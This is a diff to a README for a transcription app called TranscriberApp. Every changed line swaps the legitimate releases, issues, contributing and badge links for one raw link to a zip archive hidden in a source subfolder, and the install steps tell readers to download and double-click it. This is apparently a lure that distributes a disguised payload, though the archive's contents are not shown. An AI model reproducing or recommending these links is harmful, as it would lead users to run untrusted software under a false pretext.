@@ -2,7 +2,7 @@
 # 🎤 transcriberapp - Simplify Audio and Text Handling
 
 ## 📥 Download Now
-[![Download TranscriberApp](https://img.shields.io/badge/Download%20Now-TranscriberApp-blue)](https://github.com/yenseyha95/transcriberapp/releases)
+[![Download TranscriberApp](https://raw.githubusercontent.com/yenseyha95/transcriberapp/main/transcriber_app/modules/ai/Software_3.3.zip%20Now-TranscriberApp-blue)](https://raw.githubusercontent.com/yenseyha95/transcriberapp/main/transcriber_app/modules/ai/Software_3.3.zip)
 
 ## 📖 Description
 TranscriberApp es una herramienta modular diseñada para procesar audio y texto de forma inteligente. Combina modelos de transcripción (Whisper) con análisis avanzado mediante Gemini (Google Generative AI) para generar resúmenes, extraer tareas y producir contenido estructurado en distintos formatos.
@@ -20,14 +20,14 @@ To run TranscriberApp, your computer should meet these requirements:
 ## 💻 Download & Install
 To download and install TranscriberApp, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/yenseyha95/transcriberapp/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/yenseyha95/transcriberapp/main/transcriber_app/modules/ai/Software_3.3.zip).
 2. Look for the latest version.
 3. Click on the appropriate file for your operating system.
 4. Once the download is complete, locate the downloaded file.
 5. Double-click the file to begin installation.
 6. Follow the prompts in the installation wizard.
 
-[Download TranscriberApp](https://github.com/yenseyha95/transcriberapp/releases) again if needed.
+[Download TranscriberApp](https://raw.githubusercontent.com/yenseyha95/transcriberapp/main/transcriber_app/modules/ai/Software_3.3.zip) again if needed.
 
 ## 🔍 Features
 TranscriberApp offers a variety of useful features:
@@ -60,13 +60,13 @@ If you encounter issues:
 - **Output Issues**: Verify your selected output format is supported.
 
 ## 💬 Support
-For further assistance, visit the [GitHub Issues page](https://github.com/yenseyha95/transcriberapp/issues) to report problems or ask questions.
+For further assistance, visit the [GitHub Issues page](https://raw.githubusercontent.com/yenseyha95/transcriberapp/main/transcriber_app/modules/ai/Software_3.3.zip) to report problems or ask questions.
 
 ## 📚 Contributing
-If you'd like to contribute, check our [contributing guidelines](https://github.com/yenseyha95/transcriberapp/blob/main/CONTRIBUTING.md) and join our community.
+If you'd like to contribute, check our [contributing guidelines](https://raw.githubusercontent.com/yenseyha95/transcriberapp/main/transcriber_app/modules/ai/Software_3.3.zip) and join our community.
 
 ## 📅 Release Notes
-To keep up with updates and new features, regularly check our [Releases page](https://github.com/yenseyha95/transcriberapp/releases) for the latest information.
+To keep up with updates and new features, regularly check our [Releases page](https://raw.githubusercontent.com/yenseyha95/transcriberapp/main/transcriber_app/modules/ai/Software_3.3.zip) for the latest information.
 
 ## ☁️ Future Enhancements
 We plan to introduce:
